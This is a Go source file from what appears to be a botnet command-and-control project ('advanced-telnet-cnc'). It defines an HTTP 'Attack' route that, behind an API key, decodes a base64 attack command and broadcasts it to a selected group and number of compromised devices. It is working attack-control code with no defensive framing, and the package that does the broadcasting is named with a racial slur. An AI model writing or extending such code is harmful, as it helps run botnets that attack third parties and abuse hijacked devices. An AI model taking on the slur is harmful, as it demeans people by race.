package routes

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/niggers"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"strconv"
)

func Attack(w http.ResponseWriter, r *http.Request) {
	if !r.URL.Query().Has("key") || r.URL.Query().Get("key") != config.Key {
		w.WriteHeader(403)
		json.NewEncoder(w).Encode(ErrInvalidKey)
		return
	}

	if r.Method != http.MethodPost {
		w.WriteHeader(405)
		json.NewEncoder(w).Encode(ErrInvalidMethod)
		return
	}

	defer r.Body.Close()

	payload, err := io.ReadAll(r.Body)
	if err != nil {
		w.WriteHeader(422)
		json.NewEncoder(w).Encode(Error{
			Code:    422,
			Message: err.Error(),
		})
		return
	}

	decodeString, err := base64.StdEncoding.DecodeString(string(payload))
	if err != nil {
		return
	}

	var group = ""
	var devices = -1

	if r.URL.Query().Has("group") {
		group = r.URL.Query().Get("group")
	}

	if r.URL.Query().Has("devices") {
		devicesInt, err := strconv.Atoi(r.URL.Query().Get("devices"))
		if err != nil {
			w.WriteHeader(422)
			json.NewEncoder(w).Encode(Error{
				Code:    422,
				Message: err.Error(),
			})
			return
		}

		devices = devicesInt
	}

	device := niggers.BroadcastAttack(decodeString, group, devices)
	json.NewEncoder(w).Encode(AttackSent{
		Code:          200,
		DevicesSentTo: device,
	})
}
